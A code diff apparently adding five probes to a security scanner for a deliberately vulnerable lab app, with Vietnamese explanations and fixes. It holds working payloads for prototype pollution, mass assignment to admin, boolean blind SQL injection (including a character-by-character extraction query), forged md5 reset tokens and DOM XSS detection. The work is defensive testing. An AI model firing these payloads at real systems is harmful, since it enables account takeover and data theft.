@@ -5,6 +5,7 @@ import { assertAuthorizedTarget } from '../guard.js';
 import { fetchPage, sleep } from './http.js';
 import { jwtSign } from '../lab/jwtx.js';
 import os from 'node:os';
+import crypto from 'node:crypto';
 
 const ENC = encodeURIComponent;
 
@@ -401,6 +402,109 @@ async function xxeProbe(base) {
   return null;
 }
 
+async function protoPollutionProbe(base) {
+  const marker = `scanmark${Math.floor(Math.random() * 1e6)}`;
+  // PHẢI gửi JSON thô: object literal {__proto__:...} bị JS nuốt mất (setter
+  // prototype) — JSON.stringify sẽ ra '{}'. JSON.parse phía server tạo key
+  // __proto__ như OWN property nên merge đọc được.
+  await fetchPage(base + '/api/config', {
+    method: 'POST',
+    body: `{"__proto__":{"${marker}":true}}`,
+    headers: { 'content-type': 'application/json' },
+  });
+  const r = await fetchPage(base + '/api/config');
+  if (r.ok && r.status === 200 && r.body.includes(marker)) {
+    return {
+      id: 'PROTO-001',
+      title: 'Prototype Pollution tại POST /api/config — nhiễm được Object.prototype',
+      severity: 'high',
+      vulnerable: true,
+      evidence: `POST {"__proto__":{"${marker}":true}} → GET /api/config liệt kê "${marker}" trong protoPolluted — key đã ghi xuyên vào prototype toàn cục.`,
+      detail:
+        'Merge đệ quy không lọc key: dst.__proto__ trỏ Object.prototype nên key con bị ghi xuyên vào prototype TOÀN CỤC — mọi object trong process kế thừa thuộc tính độc. Trên app thật: bypass check obj.isAdmin, đổi logic mặc định, RCE qua gadget (template engine, options object).',
+      fix: 'Lọc __proto__/constructor/prototype khi merge (safeMerge bản hardened); dùng Object.create(null)/Map; validate schema đầu vào; Object.freeze(Object.prototype) cho dịch vụ nhạy cảm.',
+    };
+  }
+  return null;
+}
+
+async function massAssignProbe(base) {
+  const uname = `scanuser${Date.now() % 100000}`;
+  const r = await fetchPage(`${base}/api/register?role=admin`, {
+    method: 'POST',
+    body: `username=${uname}&password=probe12345`,
+    headers: { 'content-type': 'application/x-www-form-urlencoded' },
+  });
+  if (r.ok && (r.status === 200 || r.status === 201) && /"role":\s*"admin"/.test(r.body || '')) {
+    return {
+      id: 'MASS-001',
+      title: 'Mass Assignment — /api/register nhận trội role=admin',
+      severity: 'high',
+      vulnerable: true,
+      evidence: `POST /api/register?role=admin (form chỉ có username+password) → response trả user mới với "role": "admin".`,
+      detail:
+        'Endpoint copy TOÀN BỘ field client (kể cả query string) vào object user — client tự cấp quyền. Đây là lỗi "tin tưởng input shape": thiếu whitelist field được phép.',
+      fix: 'Whitelist field khi tạo/cập nhật object: chỉ lấy username+password, gán cứng role=user (bản hardened). Không bao giờ spread/Object.assign input thô vào entity.',
+    };
+  }
+  return null;
+}
+
+async function blindSqliProbe(base) {
+  const yes = await fetchPage(`${base}/track?code=${ENC('AB-100\' AND 1=1 --')}`);
+  const no = await fetchPage(`${base}/track?code=${ENC('AB-100\' AND 1=2 --')}`);
+  const noData = no.status === 404 || /không tìm thấy/.test(no.body || '');
+  if (yes.ok && yes.status === 200 && /TỒN TẠI/.test(yes.body || '') && noData) {
+    return {
+      id: 'BLIND-001',
+      title: 'Blind SQL Injection (boolean oracle) tại /track?code=',
+      severity: 'high',
+      vulnerable: true,
+      evidence: `code=AB-100' AND 1=1 -- → 200 "TỒN TẠI"; cùng mã với AND 1=2 -- → ${no.status}/không-tìm-thấy. Endpoint là oracle boolean.`,
+      detail:
+        'Không lộ dữ liệu trực tiếp nhưng response khác nhau theo điều kiện đúng/sai → rút CSDL từng ký tự: AB-100\' AND (SELECT substr(flag,N,1) FROM ctf_blind)=\'X\' --. Đây là dạng SQLi khó phát hiện nhất (không có error, không có data trong response).',
+      fix: 'Parameterized query (trackShipmentSafe) — điều kiện inject bị coi là chuỗi literal, oracle biến mất. Bản hardened trả 404 cho mọi payload.',
+    };
+  }
+  return null;
+}
+
+async function resetTokenProbe(base) {
+  const r = await fetchPage(`${base}/api/reset/request?user=carol`);
+  // Bản vuln trả token = md5(username)[0:12] — tự tính lại để chứng minh dự đoán được.
+  const expected = crypto.createHash('md5').update('carol').digest('hex').slice(0, 12);
+  if (r.ok && r.status === 200 && (r.body || '').includes(expected)) {
+    return {
+      id: 'RESET-001',
+      title: 'Password-reset token dự đoán được (md5(username)) tại /api/reset/',
+      severity: 'high',
+      vulnerable: true,
+      evidence: `GET /api/reset/request?user=carol trả token = md5("carol")[0:12] = ${expected} — forge được cho MỌI user.`,
+      detail:
+        'Token reset mật khẩu là mật mã một chiều của DỮ LIỆU CÔNG KHAI (username) → không cần đọc email ai cũng tự sinh được → chiếm tài khoản tuỳ ý (account takeover). Thiếu: randomness, expiry, one-time-use.',
+      fix: 'Token crypto.randomBytes ≥128-bit, lưu hash server-side, hết hạn ~10 phút, dùng một lần, gửi qua kênh ngoài (email) — bản hardened demo đúng mô hình này.',
+    };
+  }
+  return null;
+}
+
+async function domXssProbe(base) {
+  const r = await fetchPage(`${base}/dom`);
+  if (r.ok && r.status === 200 && /location\.hash/.test(r.body || '') && /innerHTML/.test(r.body || '')) {
+    return {
+      id: 'DOMXSS-001',
+      title: 'DOM-based XSS tại /dom — location.hash → innerHTML',
+      severity: 'medium',
+      vulnerable: true,
+      evidence: 'Response chứa script đọc location.hash và gán vào innerHTML — sink nguy hiểm nhận source do client kiểm soát.',
+      detail:
+        'Payload nằm trong fragment (#...) — KHÔNG gửi lên server → không xuất hiện trong access log/WAF → nhóm XSS "vô hình" phía server. Đây là lý do DOM XSS cần kiểm tra phía client (source/sink analysis).',
+      fix: 'Dùng textContent/text thay innerHTML (bản hardened); nếu bắt buộc render markup → sanitize bằng DOMPurify; tránh đọc location.hash/URL params vào sink.',
+    };
+  }
+  return null;
+}
+
 export const CHECKS = [
   { id: 'HDR', fn: headerProbe },
   { id: 'CKI', fn: cookieProbe },
@@ -415,6 +519,11 @@ export const CHECKS = [
   { id: 'OREDIR', fn: openRedirectProbe },
   { id: 'UPLOAD', fn: uploadProbe },
   { id: 'XXE', fn: xxeProbe },
+  { id: 'PROTO', fn: protoPollutionProbe },
+  { id: 'MASS', fn: massAssignProbe },
+  { id: 'BLIND', fn: blindSqliProbe },
+  { id: 'RESET', fn: resetTokenProbe },
+  { id: 'DOMXSS', fn: domXssProbe },
   { id: 'RPS', fn: rateLimitProbe },
 ];
 
